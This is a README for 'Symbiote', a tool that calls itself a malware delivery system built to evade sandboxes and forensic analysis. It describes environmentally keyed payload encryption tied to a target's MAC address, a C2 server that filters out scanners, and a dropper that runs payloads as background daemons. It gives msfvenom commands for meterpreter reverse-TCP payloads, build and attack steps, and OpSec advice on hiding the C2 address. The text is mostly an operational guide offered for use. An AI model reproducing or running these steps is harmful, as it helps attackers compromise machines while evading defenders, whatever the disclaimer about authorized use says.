# 🦠 Symbiote: Environmental Keyed Payload Delivery

![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![C](https://img.shields.io/badge/C-Implant-A8B9CC?style=flat&logo=c)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
![Category](https://img.shields.io/badge/Category-Red%20Team%20%2F%20Evasion-red)

**Symbiote** is a cross-platform malware delivery system designed to evade sandbox analysis and forensic investigation. It utilizes **Environmental Keying**, meaning the payload is encrypted using the target machine's physical hardware ID (MAC Address). If the payload is executed in a sandbox, a researcher's VM, or any machine other than the intended target, it fails to decrypt and remains harmless garbage data.

---

## 🏗️ Architecture

Symbiote operates on a **"Lock and Key"** model:

1.  **The Lock (Builder):** The payload is XOR-encrypted using the victim's MAC address.
2.  **The Guard (C2 Server):** A Go-based HTTP server hosts the file but only serves it to agents with a specific secret User-Agent.
3.  **The Key (Implant):** A C-based dropper runs on the victim, detects its own MAC address, downloads the payload, decrypts it in memory, and executes it as a background daemon.

```mermaid
graph TD
    A[Attacker] -->|1. Build & Encrypt (Key: Target MAC)| B(Encrypted Payload)
    B -->|2. Host File| C[Go C2 Server]
    D[Victim Machine] -->|3. Request (Secret User-Agent)| C
    C -->|4. Download Encrypted Blob| D
    D -->|5. Detect Local MAC| D
    D -->|6. XOR Decrypt| E{MAC Match?}
    E -->|Yes| F[Execute Payload]
    E -->|No| G[Crash / Garbage Data]
✨ Key Features
🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target.

🐧 🪟 Cross-Platform Support: Single codebase supports both Windows (WinHTTP, ShellExecute) and Linux (Sockets, Fork/Setsid).

👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to ensure persistence.

💾 Universal Dropper: Capable of dropping and executing any file type (ELF, EXE, Scripts), not just raw shellcode.

🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners.

📦 Installation & Build
Before using the tool, you must compile the Commander (Go CLI) on your attacker machine.

Prerequisites
Go (Golang): To build the commander tool.

GCC / MinGW: To compile the C implant.

Steps
Clone the Repository:

Bash

git clone [https://github.com/YOUR_USERNAME/Project-Symbiote.git](https://github.com/YOUR_USERNAME/Project-Symbiote.git)
cd Project-Symbiote
Build the Tool:

Bash

# Initialize Go modules
go mod tidy

# If you are on Windows:
go build -o symbiote.exe main.go

# If you are on Linux/Mac:
go build -o symbiote main.go
You now have the executable CLI tool (symbiote.exe or symbiote) ready to use.

🚀 Usage Guide
1. Reconnaissance
Obtain the MAC address of your target machine.

Linux: ip link or ifconfig (e.g., 08-8F-C3-12-3F-0E)

Windows: ipconfig /all

2. Payload Generation
Generate a Stageless payload (recommended for stability).

Linux Payload:

Bash

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o malware.elf
Windows Payload:

Bash

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o malware.exe
3. Weaponization (Encryption)
Use your compiled Symbiote tool to lock the payload to the target.

Bash

# Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>

# Example (Windows PowerShell)
./symbiote.exe build --mac 08-8F-C3-12-3F-0E --input malware.elf
Output: favicon.ico (Encrypted file)

4. Compile the Implant
Compile the C loader for your target OS using GCC.

For Linux Targets:

Bash

gcc implant/implant.c -o implant-linux
For Windows Targets:

Bash

gcc implant/implant.c -o implant.exe -lwinhttp -liphlpapi -lshell32
5. Execution (The Attack)
Terminal 1: Attacker (C2 Server) Start the delivery server using your tool.

Bash

# Windows
./symbiote.exe serve --port 8080

# Linux
./symbiote serve --port 8080
Terminal 2: Victim (Implant) Run the compiled implant, pointing it to the attacker's IP.

Bash

# ./implant <ATTACKER_IP> <PORT>
./implant-linux 192.168.1.50 8080
⚠️ Operational Security (OpSec) Notes
Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this should be hardcoded or patched into the binary to avoid process listing detection (ps aux).

Disk Drop: This tool acts as a Dropper (writes to %TEMP% or /tmp). While this ensures compatibility with complex binaries (ELF/EXE), it is less stealthy than pure in-memory injection.

⚖️ Disclaimer
This project is for educational purposes and authorized Red Team engagements only.

The author is not responsible for any misuse of this tool. Do not use this against systems you do not have explicit permission to test.